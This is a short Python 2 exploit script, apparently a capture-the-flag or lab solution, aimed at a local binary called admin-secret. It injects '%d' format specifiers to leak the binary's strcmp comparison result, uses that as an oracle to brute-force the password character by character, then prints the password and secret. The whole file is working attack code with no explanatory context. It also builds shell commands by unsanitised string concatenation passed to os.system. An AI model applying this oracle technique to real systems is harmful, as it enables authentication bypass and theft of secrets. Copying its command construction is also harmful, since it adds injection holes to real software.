import os

password = ''
char_to_add = 'a'
secret = None
i = 1
def get_strcmp(password, char):
        command = '/home/bob/Public/admin-secret "'+ password + char + ' %d %d %d %d %d %d %d" > admin_output.txt'
        os.system(command)
        output = open('admin_output.txt')
        line = output.readline()
        strcmp_result = line[-3:-1].strip()
        result = int(strcmp_result)
        output.close()
        return result

def get_secret(password):
        command = '/home/bob/Public/admin-secret ' + password + ' > admin_secret.txt'
        os.system(command)
        output = open('admin_secret.txt')
        line = output.readline()
        output.close()
        return line

while secret == None:
        strcmp_result = get_strcmp(password, char_to_add)
        if strcmp_result == 1:
                char_to_add = ord(char_to_add)
                char_to_add += 1
                char_to_add = unichr(char_to_add)
        else:
                check_for_secret = get_secret(password+char_to_add)
                if 'Secret' in check_for_secret:
                        password = password + char_to_add
                        secret = check_for_secret
                        print "Password:", password
                        print secret.strip()
                else:
                        char_to_add = ord(char_to_add)
                        char_to_add -= 1
                        char_to_add = unichr(char_to_add)
                        password = password + char_to_add
                        char_to_add = 'a'